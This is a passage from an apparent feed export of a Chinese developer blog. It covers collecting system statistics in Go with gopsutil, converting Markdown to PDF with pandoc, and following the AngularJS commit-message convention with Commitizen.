class="line"></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/cpu"</span></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/disk"</span></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/load"</span></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/mem"</span></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/net"</span></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/process"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	fmt.Println(<span class="string">"CPU统计:"</span>)</div><div class="line">	c, _ := cpu.Info()</div><div class="line">	fmt.Println(c)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"内存统计:"</span>)</div><div class="line">	m, _ := mem.VirtualMemory()</div><div class="line">	fmt.Println(m)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"磁盘用量和IO统计:"</span>)</div><div class="line">	dp, _ := disk.Partitions(<span class="literal">true</span>)</div><div class="line">	du, _ := disk.Usage(<span class="string">"/"</span>)</div><div class="line">	di, _ := disk.IOCounters()</div><div class="line">	fmt.Println(du)</div><div class="line">	fmt.Println(dp)</div><div class="line">	fmt.Println(di)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"网络IO统计:"</span>)</div><div class="line">	ni, _ := net.IOCounters(<span class="literal">true</span>)</div><div class="line">	fmt.Println(ni)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"协议统计:"</span>)</div><div class="line">	nt, _ := net.ProtoCounters(<span class="literal">nil</span>)</div><div class="line">	fmt.Println(nt)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"链接状态统计:"</span>)</div><div class="line">	nc, _ := net.Connections(<span class="string">"all"</span>)</div><div class="line">	fmt.Println(nc)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"进程统计:"</span>)</div><div class="line">	pi, _ := process.Pids()</div><div class="line">	fmt.Println(pi)</div><div class="line">	p, _ := process.NewProcess(<span class="number">614</span>)</div><div class="line">	pm, _ := p.MemoryPercent()</div><div class="line">	pn, _ := p.Username()</div><div class="line">	fmt.Println(pm)</div><div class="line">	fmt.Println(pn)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"负载统计:"</span>)</div><div class="line">	pl, _ := load.Avg()</div><div class="line">	fmt.Println(pl)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后执行过会的结果大概为这样:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">CPU统计:</div><div class="line">[&#123;&quot;cpu&quot;:0,&quot;vendorId&quot;:&quot;GenuineIntel&quot;,&quot;family&quot;:&quot;6&quot;,&quot;model&quot;:&quot;69&quot;,&quot;stepping&quot;:1,&quot;physicalId&quot;:&quot;&quot;,&quot;coreId&quot;:&quot;&quot;,&quot;cores&quot;:2,&quot;modelName&quot;:&quot;Intel(R) Core(TM) i5-4278U CPU @ 2.60GHz&quot;,&quot;mhz&quot;:2600,&quot;cacheSize&quot;:256,&quot;flags&quot;:[&quot;fpu&quot;,&quot;vme&quot;,&quot;de&quot;,&quot;pse&quot;,&quot;tsc&quot;,&quot;msr&quot;,&quot;pae&quot;,&quot;mce&quot;,&quot;cx8&quot;,&quot;apic&quot;,&quot;sep&quot;,&quot;mtrr&quot;,&quot;pge&quot;,&quot;mca&quot;,&quot;cmov&quot;,&quot;pat&quot;,&quot;pse36&quot;,&quot;clfsh&quot;,&quot;ds&quot;,&quot;acpi&quot;,&quot;mmx&quot;,&quot;fxsr&quot;,&quot;sse&quot;,&quot;sse2&quot;,&quot;ss&quot;,&quot;htt&quot;,&quot;tm&quot;,&quot;pbe&quot;,&quot;sse3&quot;,&quot;pclmulqdq&quot;,&quot;dtes64&quot;,&quot;mon&quot;,&quot;dscpl&quot;,&quot;vmx&quot;,&quot;est&quot;,&quot;tm2&quot;,&quot;ssse3&quot;,&quot;fma&quot;,&quot;cx16&quot;,&quot;tpr&quot;,&quot;pdcm&quot;,&quot;sse4.1&quot;,&quot;sse4.2&quot;,&quot;x2apic&quot;,&quot;movbe&quot;,&quot;popcnt&quot;,&quot;aes&quot;,&quot;pcid&quot;,&quot;xsave&quot;,&quot;osxsave&quot;,&quot;seglim64&quot;,&quot;tsctmr&quot;,&quot;avx1.0&quot;,&quot;rdrand&quot;,&quot;f16c&quot;,&quot;smep&quot;,&quot;erms&quot;,&quot;rdwrfsgs&quot;,&quot;tsc_thread_offset&quot;,&quot;bmi1&quot;,&quot;avx2&quot;,&quot;bmi2&quot;,&quot;invpcid&quot;,&quot;fpu_csds&quot;,&quot;syscall&quot;,&quot;xd&quot;,&quot;1gbpage&quot;,&quot;em64t&quot;,&quot;lahf&quot;,&quot;lzcnt&quot;,&quot;rdtscp&quot;,&quot;tsci&quot;]&#125;]</div><div class="line">内存统计:</div><div class="line">&#123;&quot;total&quot;:8589934592,&quot;available&quot;:4315959296,&quot;used&quot;:4273975296,&quot;usedPercent&quot;:49.7556209564209,&quot;free&quot;:3390992384,&quot;active&quot;:2908176384,&quot;inactive&quot;:924966912,&quot;wired&quot;:1364955136,&quot;buffers&quot;:0,&quot;cached&quot;:0,&quot;writeback&quot;:0,&quot;dirty&quot;:0,&quot;writebacktmp&quot;:0,&quot;shared&quot;:0,&quot;slab&quot;:0,&quot;pagetables&quot;:0,&quot;swapcached&quot;:0&#125;</div><div class="line">磁盘用量和IO统计:</div><div class="line">&#123;&quot;path&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;total&quot;:249769230336,&quot;free&quot;:201003577344,&quot;used&quot;:48503508992,&quot;usedPercent&quot;:19.41932916506611,&quot;inodesTotal&quot;:60978814,&quot;inodesUsed&quot;:11905675,&quot;inodesFree&quot;:49073139,&quot;inodesUsedPercent&quot;:19.524281006842802&#125;</div><div class="line">[&#123;&quot;device&quot;:&quot;/dev/disk1&quot;,&quot;mountpoint&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;opts&quot;:&quot;rw,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;devfs&quot;,&quot;mountpoint&quot;:&quot;/dev&quot;,&quot;fstype&quot;:&quot;devfs&quot;,&quot;opts&quot;:&quot;rw,suiddir,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map -hosts&quot;,&quot;mountpoint&quot;:&quot;/net&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,nosuid,suiddir,nosymfollow,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map auto_home&quot;,&quot;mountpoint&quot;:&quot;/home&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,suiddir,nosymfollow,multilabel&quot;&#125;]</div><div class="line">map[]</div><div class="line">网络IO统计:</div><div class="line">[&#123;&quot;name&quot;:&quot;lo0&quot;,&quot;bytesSent&quot;:22687,&quot;bytesRecv&quot;:22687,&quot;packetsSent&quot;:215,&quot;packetsRecv&quot;:215,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;gif0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;stf0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en0&quot;,&quot;bytesSent&quot;:6401764,&quot;bytesRecv&quot;:120874758,&quot;packetsSent&quot;:85192,&quot;packetsRecv&quot;:87266,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en1&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en2&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;p2p0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;awdl0&quot;,&quot;bytesSent&quot;:2331,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:2,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;bridg&quot;,&quot;bytesSent&quot;:342,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:1,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125;]</div><div class="line">协议统计:</div><div class="line">[]</div><div class="line">链接状态统计:</div><div class="line">[&#123;&quot;fd&quot;:13,&quot;family&quot;:2,&quot;type&quot;:2,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;*&quot;,&quot;port&quot;:63824&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;&quot;,&quot;port&quot;:0&#125;,&quot;status&quot;:&quot;&quot;,&quot;uids&quot;:null,&quot;pid&quot;:238&#125; &#123;&quot;fd&quot;:64,&quot;family&quot;:2,&quot;type&quot;:1,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;192.168.3.7&quot;,&quot;port&quot;:49224&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;191.238.172.191&quot;,&quot;port&quot;:443&#125;,&quot;status&quot;:&quot;CLOSED&quot;,&quot;uids&quot;:null,&quot;pid&quot;:394&#125;]</div><div class="line">进程统计:</div><div class="line">[1 45 46 48 49 53 54 55 62 64 65 69 70 71 73 74 76 77 79 80 81 82 83 85 88 89 93 95 96 97 98 100 101 102 105 110 118 130 133 135 136 142 143 147 149 159 168 169 170 171 172 173 174 175 179 182 183 184 185 187 188 189 190 192 195 196 197 198 200 218 219 220 226 227 229 231 232 233 237 238 239 242 243 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 265 266 267 268 269 270 271 272 273 274 276 277 278 279 280 281 282 283 284 285 286 287 289 290 291 292 294 295 296 297 299 300 302 305 307 308 311 312 314 316 317 324 325 329 339 340 342 343 344 345 346 348 360 361 362 366 367 368 371 377 386 391 392 393 394 397 423 426 427 428 429 430 433 437 443 445 446 451 452 454 455 456 461 463 469 470 474 475 477 481 483 486 487 488 511 514 554 555 624 650 711 722 723 724 725 726 727 729 736 737 741 742 743 791 866 867 878 880 883 889 516 517 518]</div><div class="line">0</div><div class="line">root</div><div class="line">负载统计:</div><div class="line">&#123;&quot;load1&quot;:1.32,&quot;load5&quot;:1.35,&quot;load15&quot;:1.31&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;很欣赏&lt;code&gt;telegraf&lt;/code&gt;的架构,之前也多次使用, 最近也要通过他来获取系统运行时信息然后上传,所以想借鉴下&lt;code&gt;telegraf&lt;/code&gt;里面的system模块的实现，看了下他的源码，发现他使用了一个名叫&lt;code&gt;gopsutils&lt;/code&gt;库来完成所有的系统数据的采集的, 于是决定手动试试这个库的功能。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="gopsutils" scheme="https://blog.yumaojun.net/tags/gopsutils/"/>
    
  </entry>
  
  <entry>
    <title>使用pandoc将markdown文档转换成pdf</title>
    <link href="https://blog.yumaojun.net/2017/01/19/markdown-to-pdf/"/>
    <id>https://blog.yumaojun.net/2017/01/19/markdown-to-pdf/</id>
    <published>2017-01-19T05:03:18.000Z</published>
    <updated>2017-01-23T05:48:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>在公司做内部分享的时候往往用ppt, 写ppt的过程中往往还有比较多的代码示例, 通常的做法就是直接截图, 其实这对使用者来说是很不友好的, 而我之前一直使用markdown写博客, 比如我这个博客, 因此就想使用MarkDown来写分享的文档, 但是MarkDown的文档并不方便内部传阅, 因此想到了一个问题: 能否用MarkDown写, 然后转换成PDF, 给同事使用？于是问了下度娘, 果然找到了一个工具: <code>Pandoc</code>, 使用下来感觉不错, 在此分享一下使用方法, 也方便以后自己查阅。<br><a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Pandoc是一个用haskell编写的开源文本转换工具，小巧迅速且支持格式广泛，堪称文本转换应用的瑞士军刀。支持很多种输入输出，有关Pandoc可以在其官网进行详细了解。下载页面可以<a href="https://github.com/jgm/pandoc" target="_blank" rel="external">点此进入</a>，在其中选择合适的版本即可（GitHub下载不多赘述), 至于详细的描述请看github上的说明。<br>我这里主要使用 <code>markdown</code>—-&gt;<code>pdf</code>。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>我这里仅介绍Mac下的安装, 需要安装<code>pandoc</code>和<code>LaTeX</code><br>其他平台官方有详尽的介绍, 具体请查看：<a href="http://pandoc.org/installing.html" target="_blank" rel="external">pandoc官方安装文档</a></p>
<h3 id="pandoc安装"><a href="#pandoc安装" class="headerlink" title="pandoc安装"></a>pandoc安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ brew install pandoc</div></pre></td></tr></table></figure>
<h3 id="LaTeX安装"><a href="#LaTeX安装" class="headerlink" title="LaTeX安装"></a>LaTeX安装</h3><p>因为我需要转换成pdf,还需要装<code>LaTeX</code>, 选一个Basic版本的安装即可, <code>LaTeX</code>的<a href="http://www.tug.org/mactex/morepackages.html" target="_blank" rel="external">下载地址</a></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>简单的使用可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pandoc -h</div></pre></td></tr></table></figure></p>
<p>详细用法可以man查看，我这里直接给干活了,我使用庞房,这里记得选一种你系统上有的字体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pandoc -N -s --toc --latex-engine=xelatex -V CJKmainfont=&apos;PingFang SC&apos; -V mainfont=&apos;Monaco&apos; -V geometry:margin=1in Keystone_extension.markdown  -o Keystone.pdf</div></pre></td></tr></table></figure></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>主要是Pandoc默认是对markDown语法有扩展，如果遇到转换后的效果和预期效果不一样, 还得阅读Pandoc扩展的MarkDown语法, 这篇博客对次介绍不错<a href="http://www.cnblogs.com/baiyangcao/p/pandoc_markdown.html" target="_blank" rel="external">Pandoc中的markdown语法</a><br>我这里仅列举一个我遇到的坑，当然如果你想使用标准的MarkDown语法，也可<code>-f markdown_strict</code>。</p>
<h3 id="图片位置对应不上"><a href="#图片位置对应不上" class="headerlink" title="图片位置对应不上"></a>图片位置对应不上</h3><p>在markDown中插入的图片和Markdown里的不一样, 这里需要在图片后面添加一个<code>\</code>, 这样图片才不会换行, 这个在它扩展语法中有描述。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在公司做内部分享的时候往往用ppt, 写ppt的过程中往往还有比较多的代码示例, 通常的做法就是直接截图, 其实这对使用者来说是很不友好的, 而我之前一直使用markdown写博客, 比如我这个博客, 因此就想使用MarkDown来写分享的文档, 但是MarkDown的文档并不方便内部传阅, 因此想到了一个问题: 能否用MarkDown写, 然后转换成PDF, 给同事使用？于是问了下度娘, 果然找到了一个工具: &lt;code&gt;Pandoc&lt;/code&gt;, 使用下来感觉不错, 在此分享一下使用方法, 也方便以后自己查阅。&lt;br&gt;
    
    </summary>
    
      <category term="文档工具" scheme="https://blog.yumaojun.net/categories/%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7/"/>
    
      <category term="pandoc" scheme="https://blog.yumaojun.net/categories/%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7/pandoc/"/>
    
    
  </entry>
  
  <entry>
    <title>commit message编写规范</title>
    <link href="https://blog.yumaojun.net/2017/01/17/commit-message-style/"/>
    <id>https://blog.yumaojun.net/2017/01/17/commit-message-style/</id>
    <published>2017-01-17T03:09:22.000Z</published>
    <updated>2017-01-17T06:11:50.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://oiw1gzfww.bkt.clouddn.com/angular-commit-message.png" alt=""><br><a id="more"></a><br>Git每次提交代码，都要写<code>Commit message</code>(提交说明)，否则就不允许提交, <code>Commit message</code>往往会用于生成<code>Change log</code>文档, 规范的<code>Commit message</code>是一个高质量项目基本要求。社区有多种<code>Commit message</code>的写法规范。其中以国际知名项目<code>AngularJS</code>的规范使用最为广泛, 因为其比较合理和系统化,并且有相应的配套工具。</p>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>格式化得<code>Commit message</code>有很多好处</p>
<ul>
<li><p>提供更多的历史信息，方便快速浏览</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ git <span class="built_in">log</span> &lt;last tag&gt; HEAD --pretty=format:%s</div><div class="line">添加testcase</div><div class="line">添加ignore格式</div><div class="line">添加py2支持</div><div class="line">补充entry_points</div><div class="line">添加测试环境文件</div><div class="line">添加tox测试相关文件</div></pre></td></tr></table></figure>
</li>
<li><p>可以过滤某些commit（比如文档改动），便于快速查找信息</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">log</span> HEAD --grep <span class="string">'添加'</span></div><div class="line">commit dfedec2ca55bc57137e1ffe430f9f7216d912ca0</div><div class="line">Merge: 5fcae1d f5c5120</div><div class="line">Author: 紫川秀 &lt;719118794@qq.com&gt;</div><div class="line">Date:   Mon Jan 9 19:13:47 2017 +0800</div><div class="line"></div><div class="line">    Merge pull request <span class="comment">#1 from huang75961/master</span></div><div class="line"></div><div class="line">    添加tox测试</div><div class="line"></div><div class="line">commit f5c5120ac5bb43529bd2eb9e83ccef023450a8a5</div><div class="line">Author: hc &lt;409438984@qq.com&gt;</div><div class="line">Date:   Mon Jan 9 19:00:32 2017 +0800</div><div class="line"></div><div class="line">    添加testcase</div></pre></td></tr></table></figure>
</li>
<li><p>可以直接从commit生成Change log<br>  这个需要配合后面的工具使用</p>
</li>
</ul>
<h2 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h2><p>每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="built_in">type</span>&gt;(&lt;scope&gt;): &lt;subject&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;footer&gt;</div></pre></td></tr></table></figure></p>
<p>其中，Header 是必需的，Body 和 Footer 可以省略。不管是哪一个部分，任何一行都不得超过72个字符（或100个字符）。这是为了避免自动换行影响美观。</p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>Header部分只有一行，包括三个字段：type（必需）、scope（可选）和subject（必需）。</p>
<h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>用于说明<code>commit</code>的类别，只允许使用下面7个标识</p>
<ul>
<li>feat：新功能（feature）</li>
<li>fix：修补bug</li>
<li>docs：文档（documentation）</li>
<li>style： 格式（不影响代码运行的变动）</li>
<li>refactor：重构（即不是新增功能，也不是修改bug的代码变动）</li>
<li>test：增加测试</li>
<li>chore：构建过程或辅助工具的变动</li>
</ul>
<p>如果type为<code>feat</code>和<code>fix</code>，则该commit将肯定出现在<code>Change log</code>之中。其他情况（docs、chore、style、refactor、test）由你决定，要不要放入<code>Change log</code>，建议是不要。</p>
<h4 id="scope"><a href="#scope" class="headerlink" title="scope"></a>scope</h4><p>scope用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同</p>
<h4 id="subject"><a href="#subject" class="headerlink" title="subject"></a>subject</h4><p>subject是 commit 目的的简短描述，不超过50个字符。</p>
<ul>
<li>以动词开头，使用第一人称现在时，比如change，而不是changed或changes</li>
<li>第一个字母小写</li>
<li>结尾不加句号（.）</li>
</ul>
<h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>Body 部分是对本次 commit 的详细描述，可以分成多行。但是有两个注意点。</p>
<ul>
<li>使用第一人称现在时，比如使用change而不是changed或changes。</li>
<li>应该说明代码变动的动机，以及与以前行为的对比。<br>下面是一个angular项目下面的一个范例。<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Protractor users were having a problem <span class="built_in">where</span> <span class="keyword">if</span> they had asynchonous code <span class="keyword">in</span> a</div><div class="line">`route.resolve` or `route.resolveRedirectTo` variable, Protractor was not</div><div class="line">waiting <span class="keyword">for</span> that code to complete before continuing. See</div><div class="line">angular/protractor<span class="comment">#789 (comment) for</span></div><div class="line">details.</div><div class="line"></div><div class="line">This commit fixes it by ensuring that `<span class="variable">$browser</span><span class="comment">#outstandingRequestCount` is</span></div><div class="line">properly increased/decreased <span class="keyword">while</span> `<span class="variable">$route</span>` (asynchronously) processes a route.</div><div class="line"></div><div class="line">Also, enhanced `ngMock` to <span class="built_in">wait</span> <span class="keyword">for</span> pending requests, before calling callbacks</div><div class="line">from `<span class="variable">$browser</span>.notifyWhenNoOutstandingRequests()`.</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Footer"><a href="#Footer" class="headerlink" title="Footer"></a>Footer</h3><p>该部分主要是用于变更过会的一些后续操作的, 比如关闭issue, 撤销之前的commit等</p>
<h4 id="关闭Issue"><a href="#关闭Issue" class="headerlink" title="关闭Issue"></a>关闭Issue</h4><p>如果当前 commit 针对某个issue，那么可以在 Footer 部分关闭这个 issue 。也可以一次关闭多个issue<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Closes <span class="comment">#112</span></div></pre></td></tr></table></figure></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Closes <span class="comment">#221, 222, 223</span></div></pre></td></tr></table></figure>
<h4 id="撤销之前的commit"><a href="#撤销之前的commit" class="headerlink" title="撤销之前的commit"></a>撤销之前的commit</h4><p>如果当前 commit 用于撤销以前的 commit，则必须以revert:开头，后面跟着被撤销 Commit 的 Header。<br>Body部分的格式是固定的，必须写成This reverts commit <code>hash</code>.，其中的<code>hash</code>是被撤销 commit 的 SHA 标识符。<br>如果当前 commit 与被撤销的 commit，在同一个发布（release）里面，那么它们都不会出现在 Change log 里面。如果两者在不同的发布，那么当前 commit，会出现在 Change log 的Reverts小标题下面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">revert: feat(pencil): add <span class="string">'graphiteWidth'</span> option</div><div class="line"></div><div class="line">This reverts commit 667ecc1654a317a13331b17617d973392f415f02.</div></pre></td></tr></table></figure></p>
<h4 id="不兼容变动"><a href="#不兼容变动" class="headerlink" title="不兼容变动"></a>不兼容变动</h4><p>如果当前代码与上一个版本不兼容，则 Footer 部分以BREAKING CHANGE开头，后面是对变动的描述、以及变动理由和迁移方法。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">BREAKING CHANGE: isolate scope bindings definition has changed.</div><div class="line"></div><div class="line">    To migrate the code follow the example below:</div><div class="line"></div><div class="line">    Before:</div><div class="line"></div><div class="line">    scope: &#123;</div><div class="line">      myAttr: <span class="string">'attribute'</span>,</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    After:</div><div class="line"></div><div class="line">    scope: &#123;</div><div class="line">      myAttr: <span class="string">'@'</span>,</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    The removed `inject` wasn<span class="string">'t generaly useful for directives so there should be no code using it.</span></div></pre></td></tr></table></figure></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>基于commit message有丰富的工具，包括编辑器，校验工具，以及生成Change log的工具</p>
<h3 id="Commitizen编辑工具"><a href="#Commitizen编辑工具" class="headerlink" title="Commitizen编辑工具"></a>Commitizen编辑工具</h3><p>Commitizen是一个撰写合格 Commit message 的工具, 详细说明<a href="https://github.com/commitizen/cz-cli" target="_blank" rel="external">github地址</a></p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>1) 全局安装(记得使用淘宝源来加速)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  ~ npm install -g commitizen</div><div class="line">➜  ~ npm install -g cz-conventional-changelog</div><div class="line"><span class="built_in">echo</span> <span class="string">'&#123; "path": "cz-conventional-changelog" &#125;'</span> &gt; ~/.czrc</div></pre></td></tr></table></figure></p>
<p>2）局部安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ npm install commitizen -g</div><div class="line">➜  ~ commitizen init cz-conventional-changelog --save-dev --save-exact</div></pre></td></tr></table></figure></p>
<p>主要如果报package.json不存在,需要添加这个文件, 这是nodejs的包管理文件, 格式可以参数<a href="https://github.com/commitizen/cz-cli/blob/master/package.json" target="_blank" rel="external">commitizen包的package.json</a></p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">➜  device git:(master) ✗ git cz</div><div class="line">cz-cli@2.9.5, cz-conventional-changelog@1.2.0</div><div class="line"></div><div class="line"></div><div class="line">Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.</div><div class="line"></div><div class="line">? Select the <span class="built_in">type</span> of change that you<span class="string">'re committing: (Use arrow keys)</span></div><div class="line">❯ feat:     A new feature</div><div class="line">  fix:      A bug fix</div><div class="line">  docs:     Documentation only changes</div><div class="line">  style:    Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)</div><div class="line">  refactor: A code change that neither fixes a bug nor adds a feature</div><div class="line">  perf:     A code change that improves performance</div><div class="line">  test:     Adding missing tests or correcting existing tests</div><div class="line">(Move up and down to reveal more choices)</div></pre></td></tr></table></figure>
